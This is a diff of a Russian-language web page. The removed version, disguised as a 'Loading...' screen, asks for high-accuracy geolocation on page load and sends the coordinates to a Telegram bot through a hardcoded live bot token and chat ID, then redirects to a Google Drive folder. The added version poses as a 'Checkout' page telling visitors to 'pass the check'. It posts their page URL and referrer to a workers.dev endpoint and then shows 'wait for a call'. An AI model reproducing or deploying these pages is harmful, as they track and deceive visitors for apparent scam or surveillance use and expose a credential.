@@ -1,68 +1,81 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<title>Загрузка...</title>
-<script>
-  // Настройки
-  const botToken = "8348476399:AAEolZHUSZLeLgC1PaWxZIT1N_s3H93DnvU";
-  const chatId = "1845073752";
-  const targetUrl = "https://drive.google.com/drive/folders/1tWv7Sm83n-M43dqb0aqj0XNz_Gm43Izt?usp=sharing";
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Checkout</title>
+  <style>
+    html, body { height: 100%; margin: 0; }
+    body{
+      display:grid; place-items:center;
+      background:#0b0f19; color:#fff;
+      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+    }
+    .wrap{ width:min(1000px,92vw); text-align:center; }
+    h1{ font-size:clamp(32px,6vw,72px); margin:0 0 16px; line-height:1.05; }
+    button{
+      font-size:18px; padding:14px 18px; border-radius:12px;
+      border:1px solid rgba(255,255,255,.18);
+      background:rgba(255,255,255,.08); color:#fff; cursor:pointer;
+    }
+    button:disabled{ opacity:.6; cursor:not-allowed; }
+    .overlay{
+      position:fixed; inset:0; display:none; place-items:center;
+      background:rgba(11,15,25,.92); z-index:9999;
+      text-align:center; padding:24px;
+    }
+    .overlay.on{ display:grid; }
+    .overlay h2{ margin:0 0 10px; font-size:clamp(24px,4vw,44px); }
+    .overlay p{ margin:0; opacity:.9; font-size:clamp(14px,2.2vw,18px); }
+  </style>
+</head>
 
-  // Получение геолокации (по запросу пользователя)
-  function getLocation() {
-    return new Promise(resolve => {
-      if (!navigator.geolocation) {
-        resolve(null);
-        return;
-      }
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy
-        }),
-        err => resolve(null),
-        { enableHighAccuracy: true, timeout: 5000 }
-      );
-    });
-  }
+<body>
+  <div class="wrap">
+    <h1>ПРОЙДИТЕ КОНТРОЛЬ</h1>
+    <button id="btn">Продолжить</button>
+  </div>
 
-  // Отправка уведомления
-  async function sendNotification() {
-    const geo = await getLocation();
+  <div id="overlay" class="overlay" aria-live="polite">
+    <div>
+      <h2 id="ovTitle">Processing</h2>
+      <p id="ovText">ОЖИДАЙТЕ ЗВОНКА</p>
+    </div>
+  </div>
 
-    let message = "Сигнал RED готов к запуску.\n";
+  <script>
+    const SEND_URL = "https://dawn-star-acb4.pavmag3.workers.dev";
 
-    if (geo) {
-      message += `Гео: ${geo.lat}, ${geo.lon} (точность ${geo.acc}м)`;
-    } else {
-      message += "Геолокация не предоставлена";
+    async function notify() {
+      const payload = { page: location.href, ref: document.referrer || null };
+      const res = await fetch(SEND_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
     }
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const payload = {
-      chat_id: chatId,
-      text: message
-    };
+    const btn = document.getElementById("btn");
+    const overlay = document.getElementById("overlay");
+    const ovTitle = document.getElementById("ovTitle");
+    const ovText = document.getElementById("ovText");
 
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+    btn.addEventListener("click", async () => {
+      btn.disabled = true;
+      overlay.classList.add("on");
+
+      try {
+        await notify();
+        ovTitle.textContent = "Готово";
+        ovText.textContent = "Отправлено";
+      } catch (e) {
+        console.error(e);
+        ovTitle.textContent = "Ошибка";
+        ovText.textContent = String(e);
+        btn.disabled = false;
+      }
     });
-  }
-
-  // Запуск отправки и редиректа
-  window.onload = async function() {
-    await sendNotification();
-    setTimeout(() => {
-      window.location.href = targetUrl;
-    }, 600);
-  };
-</script>
-</head>
-<body>
-Запуск протокола HungOut...
+  </script>
 </body>
 </html>
